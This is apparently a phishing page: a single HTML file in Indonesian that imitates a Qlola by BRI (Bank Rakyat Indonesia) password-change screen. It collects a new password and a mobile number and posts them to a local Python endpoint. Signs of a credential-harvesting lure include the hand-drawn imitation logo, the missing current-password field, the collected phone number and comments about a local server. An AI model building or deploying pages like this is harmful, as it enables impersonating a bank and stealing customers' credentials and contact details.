<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ganti Kata Sandi - QLola</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #f5f5f5; display: flex; justify-content: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 480px; background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
        
        /* Header Gelap */
        .header { background-color: #050E21; padding: 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
        .header svg { cursor: pointer; }
        .lang-selector { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 500; padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(255, 255, 255, 0.3); cursor: pointer; }

        /* Konten */
        .content { padding: 30px 24px; flex: 1; display: flex; flex-direction: column; }
        
        .logo-wrapper { text-align: center; margin-bottom: 30px; }
        
        /* Kotak Peringatan */
        .warning-box { background-color: #F2F9FC; border: 1px solid #B4D7E8; border-radius: 8px; padding: 16px; display: flex; gap: 12px; margin-bottom: 24px; }
        .warning-box svg { flex-shrink: 0; width: 24px; height: 24px; stroke: #00529C; fill: none; stroke-width: 2; }
        .warning-text { font-size: 13px; color: #1a1a1a; line-height: 1.5; }
        .warning-text b { color: #050E21; }

        /* Form Inputs */
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
        .input-box { display: flex; align-items: center; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px 16px; background: #fff; transition: border-color 0.2s; }
        .input-box:focus-within { border-color: #00529C; }
        .input-box svg.lock { width: 20px; height: 20px; stroke: #9CA3AF; fill: none; margin-right: 12px; stroke-width: 2; }
        .input-box input { border: none; outline: none; width: 100%; font-size: 15px; color: #1a1a1a; background: transparent; }
        .input-box input::placeholder { color: #9CA3AF; }
        .toggle-pwd { background: none; border: none; cursor: pointer; padding: 0; display: flex; align-items: center; }
        .toggle-pwd svg { width: 20px; height: 20px; stroke: #9CA3AF; fill: none; stroke-width: 2; }
        
        /* Input Nomor HP */
        .phone-group { display: flex; gap: 12px; }
        .phone-prefix { display: flex; align-items: center; justify-content: center; border: 1px solid #D1D5DB; border-radius: 8px; padding: 0 16px; font-size: 15px; color: #1a1a1a; background: #F9FAFB; font-weight: 500; }
        .phone-input { flex: 1; }

        /* Tombol */
        .btn { width: 100%; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; border: none; margin-top: 20px; transition: all 0.3s; }
        .btn-disabled { background-color: #F3F4F6; color: #9CA3AF; cursor: not-allowed; }
        .btn-active { background-color: #00529C; color: white; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 82, 156, 0.2); }

        /* Footer */
        .footer { text-align: center; font-size: 11px; color: #6B7280; margin-top: auto; padding-top: 40px; padding-bottom: 20px; }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Header -->
        <header class="header">
            <div class="menu-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
            </div>
            <div class="lang-selector">
                ID
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </div>
        </header>

        <main class="content">
            <!-- Logo -->
            <div class="logo-wrapper">
                <svg viewBox="0 0 200 70" width="140" xmlns="http://www.w3.org/2000/svg">
                    <path d="M15 30 C15 12, 35 12, 45 12 C55 12, 60 18, 60 30 C60 42, 55 48, 45 48 L25 48 L38 60 L30 66 L10 44 Z" fill="none" stroke="#00529C" stroke-width="8" stroke-linejoin="round"/>
                    <text x="70" y="42" font-family="Arial, sans-serif" font-size="42" font-weight="bold" fill="#00529C" letter-spacing="-2">lola</text>
                    <text x="98" y="60" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#00529C">by BRI</text>
                </svg>
            </div>

            <!-- Kotak Peringatan -->
            <div class="warning-box">
                <svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                <div class="warning-text">
                    <b>Peringatan keamanan:</b> Anda diwajibkan untuk mengganti kata sandi Anda secara berkala. Pastikan kata sandi baru terdiri dari kombinasi huruf besar, huruf kecil, angka, dan karakter khusus minimal 8 karakter.
                </div>
            </div>

            <!-- Form -->
            <form id="resetForm">
                <div class="form-group">
                    <label>Kata Sandi Baru</label>
                    <div class="input-box">
                        <svg class="lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                        <input type="password" id="newPassword" placeholder="Masukkan kata sandi baru" required>
                        <button type="button" class="toggle-pwd" onclick="togglePassword('newPassword', this)">
                            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                        </button>
                    </div>
                </div>

                <div class="form-group">
                    <label>Ulangi Sandi Baru</label>
                    <div class="input-box">
                        <svg class="lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                        <input type="password" id="confirmPassword" placeholder="Ulangi kata sandi baru" required>
                        <button type="button" class="toggle-pwd" onclick="togglePassword('confirmPassword', this)">
                            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                        </button>
                    </div>
                </div>

                <div class="form-group">
                    <label>Nomor Telepon Genggam</label>
                    <div class="phone-group">
                        <div class="phone-prefix">+62</div>
                        <div class="input-box phone-input">
                            <input type="tel" id="phoneNumber" placeholder="8XXX-XXXX-XXXX" required>
                        </div>
                    </div>
                </div>

                <button type="submit" id="btnLanjut" class="btn btn-disabled" disabled>Lanjutkan</button>
            </form>
        </main>

        <footer class="footer">
            PT. Bank Rakyat Indonesia (Persero) Tbk. · Qlola by BRI · 2026
        </footer>
    </div>

    <script>
        // Fungsi Intip Sandi
        function togglePassword(inputId, btn) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                btn.style.opacity = '0.5';
            } else {
                input.type = 'password';
                btn.style.opacity = '1';
            }
        }

        // Validasi Form (Cek kecocokan sandi & minimal 8 karakter)
        const form = document.getElementById('resetForm');
        const newPassword = document.getElementById('newPassword');
        const confirmPassword = document.getElementById('confirmPassword');
        const phoneNumber = document.getElementById('phoneNumber');
        const btnLanjut = document.getElementById('btnLanjut');

        function checkForm() {
            const isLengthValid = newPassword.value.length >= 8;
            const isMatch = newPassword.value === confirmPassword.value && newPassword.value !== '';
            const isPhoneFilled = phoneNumber.value.trim() !== '';

            if (isLengthValid && isMatch && isPhoneFilled) {
                btnLanjut.classList.remove('btn-disabled');
                btnLanjut.classList.add('btn-active');
                btnLanjut.removeAttribute('disabled');
            } else {
                btnLanjut.classList.add('btn-disabled');
                btnLanjut.classList.remove('btn-active');
                btnLanjut.setAttribute('disabled', 'true');
            }
        }

        newPassword.addEventListener('input', checkForm);
        confirmPassword.addEventListener('input', checkForm);
        phoneNumber.addEventListener('input', checkForm);

        // Kirim ke Python saat submit
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btnLanjut.textContent = 'Memproses...';
            btnLanjut.disabled = true;

            try {
                const response = await fetch('/api/reset', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        newPassword: newPassword.value,
                        phone: phoneNumber.value
                    })
                });

                if (response.ok) {
                    alert('Kata sandi berhasil diperbarui!');
                    window.location.href = 'dashboard.html';
                } else {
                    alert('Gagal memperbarui kata sandi.');
                    btnLanjut.textContent = 'Lanjutkan';
                    btnLanjut.disabled = false;
                }
            } catch (error) {
                alert('Error: Gagal terhubung ke server lokal.');
                btnLanjut.textContent = 'Lanjutkan';
                btnLanjut.disabled = false;
            }
        });
    </script>
</body>
</html>
